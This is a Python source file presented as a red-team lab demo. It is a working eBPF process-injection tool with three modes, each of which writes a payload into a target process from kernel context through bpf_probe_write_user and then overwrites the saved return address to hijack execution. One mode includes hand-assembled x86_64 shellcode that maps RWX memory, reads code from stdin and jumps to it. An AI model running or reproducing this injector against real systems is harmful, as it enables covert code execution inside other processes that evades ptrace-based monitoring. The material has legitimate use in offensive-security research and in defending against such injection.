#!/usr/bin/env python3
"""
eBPF Kernel-Context Blob Loader — Educational Red Team Lab Demo

Unlike ebpf_loader.py (which uses eBPF as a trigger and ptrace for injection),
this loader performs injection ENTIRELY from kernel context using eBPF helpers.

No ptrace. No /proc/<pid>/mem. The eBPF program itself writes the blob into
the target process's memory from inside the kernel.

Key BPF helper: bpf_probe_write_user(void *dst, void *src, u32 len)
  - Writes to the CURRENT task's userspace memory from a probe handler
  - Works on any mapped, writable page
  - No ptrace attach needed — runs in kernel context during probe execution

Techniques demonstrated:

  1. KERNEL WRITE    — Store blob in BPF map, attach uprobe to target function.
                       When target calls that function, eBPF writes blob bytes
                       into a pre-arranged RWX region chunk by chunk, then
                       overwrites the saved return address to redirect execution.

  2. SYSCALL HIJACK  — Hook sys_enter_mmap to force RWX permissions, hook
                       sys_exit_mmap to capture the allocated address, then
                       write the blob on the next probe hit. Fully autonomous.

  3. STACK SMASH     — Write a small trampoline onto the target's stack from
                       kernel context via bpf_probe_write_user, which jumps
                       to blob code written into a data section. For targets
                       without NX stack (e.g., compiled with -z execstack).

Requirements:
  - Linux 5.8+ with CONFIG_BPF_KPROBE_OVERRIDE or permissive BPF
  - BCC (apt install bpfcc-tools python3-bpfcc)
  - Root / CAP_BPF + CAP_PERFMON + CAP_SYS_ADMIN
  - picblobs package

Usage:
  # Technique 1: kernel-context write into pre-arranged region
  sudo python3 mbed/ebpf_kernel_loader.py kwrite --pid 1234

  # Technique 2: syscall hijack (fully autonomous, no cooperation needed)
  sudo python3 mbed/ebpf_kernel_loader.py hijack --pid 1234

  # Technique 3: stack trampoline (requires -z execstack target)
  sudo python3 mbed/ebpf_kernel_loader.py smash --pid 1234 --symbol read
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import math
import os
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "python"))

from picblobs import BlobData, get_blob
from picblobs._extractor import extract

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# bpf_probe_write_user can write at most this many bytes per call.
# BPF stack is 512 bytes, but the verifier may limit copy size further.
# In practice 256 bytes per write is safe across kernel versions.
BPF_WRITE_CHUNK = 256

# Default RWX load address (must be page-aligned)
DEFAULT_LOAD_ADDR = 0x7F_0000_0000

# Max blob size we can handle (64 KB — limited by BPF map + write loops)
MAX_BLOB_SIZE = 65536


# ===========================================================================
# Technique 1: Kernel-context write via bpf_probe_write_user
# ===========================================================================


def gen_kwrite_bpf(
    blob_data: bytes, load_addr: int, target_pid: int, num_chunks: int
) -> str:
    """Generate BPF C source for kernel-context blob writing.

    The blob is stored in a BPF array map (one entry per chunk).
    Each time the uprobe fires, one chunk is written to userspace
    via bpf_probe_write_user(). After all chunks are written, the
    eBPF program overwrites the return address on the stack to
    redirect execution to the blob.
    """

    return f"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define TARGET_PID   {target_pid}
#define LOAD_ADDR    {load_addr}ULL
#define CHUNK_SIZE   {BPF_WRITE_CHUNK}
#define NUM_CHUNKS   {num_chunks}
#define BLOB_SIZE    {len(blob_data)}

// Map holding blob data — one entry per chunk
BPF_ARRAY(blob_map, char[CHUNK_SIZE], NUM_CHUNKS);

// Map tracking injection state per PID
struct state_t {{
    u32 chunks_written;
    u8  done;
}};
BPF_HASH(state_map, u32, struct state_t, 4);

// Status ring buffer for userspace reporting
struct event_t {{
    u32 pid;
    u32 chunks_done;
    u64 write_addr;
    u8  stage;       // 0=chunk_written, 1=redirect, 2=done
    char comm[16];
}};
BPF_RINGBUF_OUTPUT(events, 1 << 14);

static void emit_event(u32 pid, u32 chunks, u64 addr, u8 stage) {{
    struct event_t *e = events.ringbuf_reserve(sizeof(struct event_t));
    if (!e) return;
    e->pid = pid;
    e->chunks_done = chunks;
    e->write_addr = addr;
    e->stage = stage;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    events.ringbuf_submit(e, 0);
}}

int on_uprobe_hit(struct pt_regs *ctx) {{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID)
        return 0;

    // Get or init state
    struct state_t zero = {{}};
    struct state_t *st = state_map.lookup_or_try_init(&pid, &zero);
    if (!st || st->done)
        return 0;

    u32 idx = st->chunks_written;
    if (idx >= NUM_CHUNKS) {{
        st->done = 1;
        return 0;
    }}

    // Look up this chunk's data in the blob map
    char *chunk = blob_map.lookup(&idx);
    if (!chunk)
        return 0;

    // Calculate destination address in target's address space
    u64 dst = LOAD_ADDR + (u64)idx * CHUNK_SIZE;

    // Write chunk to userspace — this is the key kernel-context operation.
    // bpf_probe_write_user() writes to the CURRENT task's user memory
    // from inside the kernel, during probe execution. No ptrace needed.
    int ret = bpf_probe_write_user((void *)dst, chunk, CHUNK_SIZE);
    if (ret < 0)
        return 0;

    st->chunks_written = idx + 1;
    emit_event(pid, idx + 1, dst, 0);

    // All chunks written?
    if (st->chunks_written >= NUM_CHUNKS) {{
        st->done = 1;

        // --- Execution redirection ---
        // Overwrite the return address on the stack.
        // When the probed function returns, it will jump to our blob.
        //
        // On x86_64, RSP points at the return address at function entry.
        // The uprobe fires at function entry, so [RSP] = return address.
        u64 blob_entry = LOAD_ADDR;
        u64 rsp = PT_REGS_SP(ctx);
        bpf_probe_write_user((void *)rsp, &blob_entry, sizeof(blob_entry));

        emit_event(pid, NUM_CHUNKS, blob_entry, 1);
    }}

    return 0;
}}
"""


def mode_kwrite(args):
    """Technique 1: Kernel-context blob write via BPF maps + bpf_probe_write_user."""
    try:
        from bcc import BPF
    except ImportError:
        print("ERROR: BCC not installed. Run: apt install bpfcc-tools python3-bpfcc")
        return 1

    pid = args.pid
    symbol = args.symbol or "write"
    library = args.library or "c"
    load_addr = int(args.load_addr, 16) if args.load_addr else DEFAULT_LOAD_ADDR

    blob, config = load_blob(args)
    payload = prepare_payload(blob, config)

    if len(payload) > MAX_BLOB_SIZE:
        print(f"[!] Blob too large: {len(payload)} > {MAX_BLOB_SIZE}")
        return 1

    # Split blob into chunks for the BPF map
    num_chunks = math.ceil(len(payload) / BPF_WRITE_CHUNK)
    # Pad to full chunk boundary
    padded = payload.ljust(num_chunks * BPF_WRITE_CHUNK, b"\x00")
    chunks = [
        padded[i : i + BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)
    ]

    print("\n[*] ══════ eBPF KERNEL-CONTEXT LOADER ══════")
    print("[*] Technique: bpf_probe_write_user (NO ptrace)")
    print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
    print(
        f"[*] Payload: {len(payload)} bytes → {num_chunks} chunks of {BPF_WRITE_CHUNK}B"
    )
    print(f"[*] Load address: {load_addr:#018x}")
    print(f"[*] Target PID: {pid}")
    print(f"[*] Probe: {library}:{symbol}")
    print()
    print(f"[*] The target must have an RWX region mapped at {load_addr:#x}.")
    print("[*] (Use the helper: prep_target.py, or mmap it manually)")
    print()
    print("[!] IMPORTANT: bpf_probe_write_user writes to the CURRENT task's")
    print("[!] memory from kernel context. No ptrace attach, no SIGSTOP,")
    print("[!] no /proc/pid/mem. The write happens inside the probe handler.")
    print()

    # Generate and load BPF program
    src = gen_kwrite_bpf(padded, load_addr, pid, num_chunks)
    b = BPF(text=src)

    # Populate the blob map with chunk data
    blob_map = b["blob_map"]
    for i, chunk in enumerate(chunks):
        key = ctypes.c_int(i)
        val = (ctypes.c_char * BPF_WRITE_CHUNK)(*chunk)
        blob_map[key] = val
    print(f"[+] Loaded {num_chunks} chunks into BPF blob_map")

    # Resolve library and attach uprobe
    lib_path = resolve_library(library)
    print(f"[*] Attaching uprobe to {lib_path}:{symbol} for PID {pid}")
    b.attach_uprobe(name=lib_path, sym=symbol, fn_name="on_uprobe_hit", pid=pid)
    print(f"[+] Uprobe attached — waiting for target to call {symbol}()...")
    print(f"[*] Need {num_chunks} calls to {symbol}() to complete injection\n")

    done = False

    def handle_event(ctx, data, size):
        nonlocal done
        event = b["events"].event(data)
        stage = event.stage
        comm = event.comm.decode("utf-8", errors="replace")

        if stage == 0:
            print(
                f"    [kernel] Chunk {event.chunks_done}/{num_chunks} written "
                f"→ {event.write_addr:#018x}  ({comm})"
            )
        elif stage == 1:
            print("\n[+] [kernel] All chunks written. Return address overwritten.")
            print(
                f"[+] [kernel] Target will jump to {event.write_addr:#018x} on "
                f"function return."
            )
            print("[+] Injection complete — entirely from kernel context.")
            done = True

    b["events"].open_ring_buffer(handle_event)

    try:
        while not done:
            b.ring_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")

    return 0


# ===========================================================================
# Technique 2: Syscall hijack — mmap interception + blob write
# ===========================================================================

BPF_HIJACK_SRC = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define TARGET_PID   __TARGET_PID__
#define CHUNK_SIZE   __CHUNK_SIZE__
#define NUM_CHUNKS   __NUM_CHUNKS__
#define BLOB_SIZE    __BLOB_SIZE__

// Blob data chunks
BPF_ARRAY(blob_map, char[CHUNK_SIZE], NUM_CHUNKS);

// Injection state machine
//   phase 0: waiting for target to call mmap
//   phase 1: mmap intercepted, waiting for return to get address
//   phase 2: have mmap address, writing chunks on each probe hit
//   phase 3: done
struct state_t {
    u32 phase;
    u64 mmap_addr;       // captured mmap return value
    u32 chunks_written;
};
BPF_HASH(state_map, u32, struct state_t, 4);

struct event_t {
    u32 pid;
    u8  phase;
    u32 detail;
    u64 addr;
    char comm[16];
};
BPF_RINGBUF_OUTPUT(events, 1 << 14);

static void emit(u32 pid, u8 phase, u32 detail, u64 addr) {
    struct event_t *e = events.ringbuf_reserve(sizeof(struct event_t));
    if (!e) return;
    e->pid = pid; e->phase = phase; e->detail = detail; e->addr = addr;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    events.ringbuf_submit(e, 0);
}

// --- Hook sys_enter_mmap: modify protection to include EXEC ---
// Raw tracepoint gives us access to syscall args before the kernel acts.
RAW_TRACEPOINT_PROBE(sys_enter) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID) return 0;

    // args: ctx->args[0] = syscall_nr
    unsigned long syscall_nr = ctx->args[1];

    // __NR_mmap = 9 on x86_64
    if (syscall_nr != 9) return 0;

    struct state_t zero = {};
    struct state_t *st = state_map.lookup_or_try_init(&pid, &zero);
    if (!st || st->phase != 0) return 0;

    // We detected a mmap call. Move to phase 1.
    // We can't modify args from raw_tracepoint easily, but we record
    // that a mmap happened so we can capture the result.
    st->phase = 1;
    emit(pid, 1, 0, 0);

    return 0;
}

// --- Hook sys_exit_mmap: capture the returned address ---
RAW_TRACEPOINT_PROBE(sys_exit) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID) return 0;

    struct state_t *st = state_map.lookup(&pid);
    if (!st || st->phase != 1) return 0;

    // ctx->args[0] = return value
    long ret = (long)ctx->args[1];
    if (ret < 0 || ret == 0) {
        // mmap failed, reset
        st->phase = 0;
        return 0;
    }

    st->mmap_addr = (u64)ret;
    st->phase = 2;
    emit(pid, 2, 0, (u64)ret);

    return 0;
}

// --- Uprobe: write blob chunks into captured mmap region ---
int on_write_trigger(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID) return 0;

    struct state_t *st = state_map.lookup(&pid);
    if (!st || st->phase != 2) return 0;

    u32 idx = st->chunks_written;
    if (idx >= NUM_CHUNKS) {
        st->phase = 3;
        return 0;
    }

    char *chunk = blob_map.lookup(&idx);
    if (!chunk) return 0;

    u64 dst = st->mmap_addr + (u64)idx * CHUNK_SIZE;
    int ret = bpf_probe_write_user((void *)dst, chunk, CHUNK_SIZE);
    if (ret < 0) return 0;

    st->chunks_written = idx + 1;
    emit(pid, 2, idx + 1, dst);

    if (st->chunks_written >= NUM_CHUNKS) {
        // Redirect execution: overwrite return address
        u64 entry = st->mmap_addr;
        u64 rsp = PT_REGS_SP(ctx);
        bpf_probe_write_user((void *)rsp, &entry, sizeof(entry));

        st->phase = 3;
        emit(pid, 3, NUM_CHUNKS, entry);
    }

    return 0;
}
"""


def mode_hijack(args):
    """Technique 2: Intercept target's own mmap, capture address, write blob."""
    try:
        from bcc import BPF
    except ImportError:
        print("ERROR: BCC not installed. Run: apt install bpfcc-tools python3-bpfcc")
        return 1

    pid = args.pid
    symbol = args.symbol or "write"
    library = args.library or "c"

    blob, config = load_blob(args)
    payload = prepare_payload(blob, config)

    if len(payload) > MAX_BLOB_SIZE:
        print(f"[!] Blob too large: {len(payload)} > {MAX_BLOB_SIZE}")
        return 1

    num_chunks = math.ceil(len(payload) / BPF_WRITE_CHUNK)
    padded = payload.ljust(num_chunks * BPF_WRITE_CHUNK, b"\x00")
    chunks = [
        padded[i : i + BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)
    ]

    print("\n[*] ══════ eBPF SYSCALL HIJACK LOADER ══════")
    print("[*] Technique: intercept target's mmap + bpf_probe_write_user")
    print("[*] Fully autonomous — no ptrace, no /proc, no cooperation")
    print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
    print(f"[*] Payload: {len(payload)} bytes → {num_chunks} chunks")
    print(f"[*] Target PID: {pid}")
    print()
    print("[*] Phase 1: Wait for target to call mmap() for any reason")
    print("[*] Phase 2: Capture returned address from kernel")
    print("[*] Phase 3: Write blob chunks via bpf_probe_write_user")
    print("[*] Phase 4: Overwrite return address → blob entry")
    print()

    src = BPF_HIJACK_SRC
    src = src.replace("__TARGET_PID__", str(pid))
    src = src.replace("__CHUNK_SIZE__", str(BPF_WRITE_CHUNK))
    src = src.replace("__NUM_CHUNKS__", str(num_chunks))
    src = src.replace("__BLOB_SIZE__", str(len(payload)))

    b = BPF(text=src)

    # Load blob data into map
    blob_map = b["blob_map"]
    for i, chunk in enumerate(chunks):
        key = ctypes.c_int(i)
        val = (ctypes.c_char * BPF_WRITE_CHUNK)(*chunk)
        blob_map[key] = val
    print(f"[+] Loaded {num_chunks} chunks into BPF blob_map")

    # Attach uprobe for the write-trigger phase
    lib_path = resolve_library(library)
    b.attach_uprobe(name=lib_path, sym=symbol, fn_name="on_write_trigger", pid=pid)
    print("[+] Probes attached. Waiting for target activity...\n")

    done = False

    def handle_event(ctx, data, size):
        nonlocal done
        event = b["events"].event(data)
        phase = event.phase
        event.comm.decode("utf-8", errors="replace")

        if phase == 1:
            print(f"[*] [kernel] Phase 1: Detected mmap syscall from PID {event.pid}")
        elif phase == 2 and event.detail == 0:
            print(f"[+] [kernel] Phase 2: Captured mmap return: {event.addr:#018x}")
        elif phase == 2 and event.detail > 0:
            print(
                f"    [kernel] Phase 3: Chunk {event.detail}/{num_chunks} "
                f"→ {event.addr:#018x}"
            )
        elif phase == 3:
            print(
                f"\n[+] [kernel] Phase 4: Return address overwritten → {event.addr:#018x}"
            )
            print(
                "[+] Fully autonomous injection complete. Zero userspace involvement."
            )
            done = True

    b["events"].open_ring_buffer(handle_event)

    try:
        while not done:
            b.ring_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")

    return 0


# ===========================================================================
# Technique 3: Stack trampoline (requires -z execstack)
# ===========================================================================


def gen_smash_bpf(trampoline: bytes, target_pid: int) -> str:
    """Generate BPF source for stack trampoline injection.

    Writes a small position-independent trampoline directly onto the
    target's stack. The trampoline:
      1. mmap's an RWX region
      2. Reads the blob from a pre-staged fd (or embeds it inline)
      3. Jumps to offset 0

    This only works if the target was compiled with -z execstack or the
    kernel has READ_IMPLIES_EXEC for the process.
    """

    # Trampoline is small enough to fit in one bpf_probe_write_user call
    hex_bytes = ",".join(f"0x{b:02x}" for b in trampoline)
    tramp_len = len(trampoline)

    return f"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define TARGET_PID {target_pid}
#define TRAMP_LEN  {tramp_len}

struct event_t {{
    u32 pid;
    u64 rsp;
    u64 tramp_addr;
    char comm[16];
}};
BPF_RINGBUF_OUTPUT(events, 1 << 14);

int on_uprobe_hit(struct pt_regs *ctx) {{
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    if (pid != TARGET_PID) return 0;

    // The trampoline shellcode — written directly to the stack
    char tramp[TRAMP_LEN] = {{ {hex_bytes} }};

    // Write trampoline below current RSP (in the red zone on x86_64,
    // or below the frame on other ABIs)
    u64 rsp = PT_REGS_SP(ctx);
    u64 tramp_addr = rsp - 256;  // well below current frame

    int ret = bpf_probe_write_user((void *)tramp_addr, tramp, TRAMP_LEN);
    if (ret < 0) return 0;

    // Overwrite return address to point at our stack trampoline
    bpf_probe_write_user((void *)rsp, &tramp_addr, sizeof(tramp_addr));

    struct event_t *e = events.ringbuf_reserve(sizeof(struct event_t));
    if (e) {{
        e->pid = pid;
        e->rsp = rsp;
        e->tramp_addr = tramp_addr;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        events.ringbuf_submit(e, 0);
    }}

    return 0;
}}
"""


# x86_64 trampoline: mmap RWX region, read blob from stdin, jump to it
# This is a minimal PIC stub that the stack-smash technique writes to the stack.
# It then bootstraps the full blob load.
TRAMPOLINE_X86_64 = bytes(
    [
        # mmap(NULL, 0x10000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
        0x48,
        0x31,
        0xFF,  # xor rdi, rdi        ; addr = NULL
        0x48,
        0xC7,
        0xC6,
        0x00,
        0x00,
        0x01,
        0x00,  # mov rsi, 0x10000    ; len = 64KB
        0x48,
        0xC7,
        0xC2,
        0x07,
        0x00,
        0x00,
        0x00,  # mov rdx, 7          ; PROT_RWX
        0x49,
        0xC7,
        0xC2,
        0x22,
        0x00,
        0x00,
        0x00,  # mov r10, 0x22       ; MAP_PRIVATE|MAP_ANON
        0x49,
        0x83,
        0xC8,
        0xFF,  # or  r8, -1          ; fd = -1
        0x4D,
        0x31,
        0xC9,  # xor r9, r9          ; offset = 0
        0x48,
        0xC7,
        0xC0,
        0x09,
        0x00,
        0x00,
        0x00,  # mov rax, 9          ; __NR_mmap
        0x0F,
        0x05,  # syscall
        # rax = mmap'd address
        0x48,
        0x89,
        0xC7,  # mov rdi, rax        ; save addr
        0x48,
        0x89,
        0xC3,  # mov rbx, rax        ; save for jump
        # read(0, mmap_addr, 0x10000)
        0x48,
        0x89,
        0xFE,  # mov rsi, rdi        ; buf = mmap addr
        0x48,
        0x31,
        0xFF,  # xor rdi, rdi        ; fd = 0 (stdin)
        0x48,
        0xC7,
        0xC2,
        0x00,
        0x00,
        0x01,
        0x00,  # mov rdx, 0x10000    ; count
        0x48,
        0x31,
        0xC0,  # xor rax, rax        ; __NR_read = 0
        0x0F,
        0x05,  # syscall
        # jump to mmap'd blob
        0xFF,
        0xE3,  # jmp rbx
    ]
)


def mode_smash(args):
    """Technique 3: Write trampoline to stack via bpf_probe_write_user."""
    try:
        from bcc import BPF
    except ImportError:
        print("ERROR: BCC not installed. Run: apt install bpfcc-tools python3-bpfcc")
        return 1

    pid = args.pid
    symbol = args.symbol or "write"
    library = args.library or "c"

    blob, _config = load_blob(args)

    print("\n[*] ══════ eBPF STACK TRAMPOLINE LOADER ══════")
    print("[*] Technique: bpf_probe_write_user → stack (requires execstack)")
    print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
    print(f"[*] Trampoline: {len(TRAMPOLINE_X86_64)} bytes (mmap+read+jmp stub)")
    print(f"[*] Target PID: {pid}")
    print(f"[*] Probe: {library}:{symbol}")
    print()
    print("[!] NOTE: Target must have executable stack (-z execstack)")
    print("[!] The trampoline will mmap RWX, read blob from stdin, and jump.")
    print("[!] Pipe the blob to the target's stdin to complete injection.")
    print()

    src = gen_smash_bpf(TRAMPOLINE_X86_64, pid)
    b = BPF(text=src)

    lib_path = resolve_library(library)
    b.attach_uprobe(name=lib_path, sym=symbol, fn_name="on_uprobe_hit", pid=pid)
    print(f"[+] Uprobe attached. Waiting for target to call {symbol}()...\n")

    done = False

    def handle_event(ctx, data, size):
        nonlocal done
        event = b["events"].event(data)
        print("[+] [kernel] Stack trampoline written!")
        print(f"    PID: {event.pid}")
        print(f"    RSP: {event.rsp:#018x}")
        print(f"    Trampoline at: {event.tramp_addr:#018x}")
        print(f"    Process: {event.comm.decode('utf-8', errors='replace')}")
        print()
        print(f"[*] When {symbol}() returns, execution will hit the trampoline.")
        print("[*] The trampoline will mmap RWX + read blob from fd 0 + jump.")
        done = True

    b["events"].open_ring_buffer(handle_event)

    try:
        while not done:
            b.ring_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n[*] Interrupted")

    return 0


# ===========================================================================
# Shared helpers
# ===========================================================================


def load_blob(args) -> tuple[BlobData, bytes]:
    """Load blob from package or .so path."""
    config = bytes.fromhex(args.config_hex) if args.config_hex else b""
    if args.so:
        blob = extract(
            args.so,
            blob_type=args.blob_type,
            target_os=args.blob_os,
            target_arch=args.blob_arch,
        )
    else:
        blob = get_blob(args.blob_type, args.blob_os, args.blob_arch)
    print(f"[*] Blob: {len(blob.code)} bytes, SHA-256: {blob.sha256[:16]}...")
    return blob, config


def prepare_payload(blob: BlobData, config: bytes) -> bytes:
    """Merge blob code + config into final payload."""
    payload = bytearray(blob.code)
    if config:
        offset = blob.config_offset
        payload[offset : offset + len(config)] = config
    return bytes(payload)


def resolve_library(library: str) -> str:
    """Resolve a library name to its full path."""
    if "/" in library:
        return library
    import subprocess

    lib = ctypes.util.find_library(library)
    if lib:
        result = subprocess.run(["ldconfig", "-p"], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if lib in line and "x86-64" in line:
                return line.split("=>")[-1].strip()
    return f"/lib/x86_64-linux-gnu/lib{library}.so.6"


def add_blob_args(parser):
    """Add common blob selection arguments."""
    parser.add_argument("--blob-type", default="hello")
    parser.add_argument("--blob-os", default="linux")
    parser.add_argument("--blob-arch", default="x86_64")
    parser.add_argument("--config-hex", default="")
    parser.add_argument("--so", default="")


def main():
    parser = argparse.ArgumentParser(
        description="eBPF Kernel-Context Blob Loader — Red Team Lab Demo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Techniques:
  kwrite  — Write blob via bpf_probe_write_user into pre-mapped RWX region
  hijack  — Intercept target's mmap syscall, capture address, write blob
  smash   — Write mmap+read+jmp trampoline onto executable stack

All three run the injection from KERNEL CONTEXT via eBPF — no ptrace.

Examples:
  sudo python3 mbed/ebpf_kernel_loader.py kwrite --pid 1234
  sudo python3 mbed/ebpf_kernel_loader.py hijack --pid 1234 --symbol printf
  sudo python3 mbed/ebpf_kernel_loader.py smash  --pid 1234 --symbol read
        """,
    )

    subs = parser.add_subparsers(dest="technique", required=True)

    # Technique 1: kwrite
    p1 = subs.add_parser(
        "kwrite", help="Kernel-context write into pre-arranged RWX region"
    )
    p1.add_argument("--pid", type=int, required=True)
    p1.add_argument("--symbol", default="write")
    p1.add_argument("--library", default="c")
    p1.add_argument(
        "--load-addr", default=None, help="Hex load address (default: 0x7F00000000)"
    )
    add_blob_args(p1)

    # Technique 2: hijack
    p2 = subs.add_parser(
        "hijack",
        help="Intercept mmap syscall + kernel-context write (fully autonomous)",
    )
    p2.add_argument("--pid", type=int, required=True)
    p2.add_argument("--symbol", default="write")
    p2.add_argument("--library", default="c")
    add_blob_args(p2)

    # Technique 3: smash
    p3 = subs.add_parser(
        "smash", help="Stack trampoline via bpf_probe_write_user (needs execstack)"
    )
    p3.add_argument("--pid", type=int, required=True)
    p3.add_argument("--symbol", default="write")
    p3.add_argument("--library", default="c")
    add_blob_args(p3)

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] WARNING: Requires root for eBPF + bpf_probe_write_user")
        print("[!] Run with: sudo python3 mbed/ebpf_kernel_loader.py ...\n")

    handlers = {
        "kwrite": mode_kwrite,
        "hijack": mode_hijack,
        "smash": mode_smash,
    }

    return handlers[args.technique](args)


if __name__ == "__main__":
    sys.exit(main() or 0)
